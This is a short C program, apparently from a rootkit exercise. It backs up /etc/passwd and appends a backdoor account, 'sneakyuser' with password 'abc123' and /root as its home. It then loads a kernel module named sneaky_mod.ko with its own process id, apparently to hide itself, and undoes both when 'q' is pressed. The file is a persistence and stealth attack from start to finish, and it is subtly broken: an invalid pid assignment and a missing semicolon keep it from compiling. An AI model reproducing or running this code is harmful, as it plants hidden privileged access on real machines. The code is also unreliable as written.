#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>
#include "string.h"

void copyAndStorePwd(){
    system("cp /etc/passwd /tmp");
    system("echo 'sneakyuser:abc123:2000:2000:sneakyuser:/root:bash\n' >> /etc/passwd");
}

void loadSneakyMod(){
    char cmd[50];
    strcpy(cmd,"insmod sneaky_mod.ko pid=");
    char pid[20] = getpid();
    strcat(cmd,pid);
    system(cmd);
}

void unloadSneakyMod(){
    system("rmmod sneaky_mod.ko");
}

void restorePwd(){
    system("rm /etc/passwd")
    system("cp /tmp/passwd /etc");
    system("rm /tmp/passwd");
}

int main() {
    printf("sneaky_process pid = %d\n", getpid());
    copyAndStorePwd();
    loadSneakyMod();
    char c;
    while ((c = getchar()) != 'q') {
    }
    unloadSneakyMod();
    restorePwd();
    return EXIT_SUCCESS;
}